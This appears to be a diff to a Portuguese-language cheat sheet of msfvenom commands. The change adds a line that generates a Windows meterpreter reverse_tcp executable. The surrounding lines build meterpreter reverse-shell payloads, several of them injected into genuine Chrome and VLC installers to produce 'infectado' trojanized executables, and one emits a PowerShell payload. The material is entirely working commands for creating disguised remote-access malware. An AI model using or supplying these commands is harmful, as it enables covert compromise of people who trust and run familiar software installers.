@@ -2,6 +2,8 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x
 
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.137 LPORT=443 -f exe -x ChromeSetup.exe -o chrome_infectado.exe
 
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.137 LPORT=4444 -f exe > atibaia_payload.exe
+
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<seu_ip> LPORT=443 -f exe -x vlc_setup.exe -o vlc_infectado.exe
 
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1
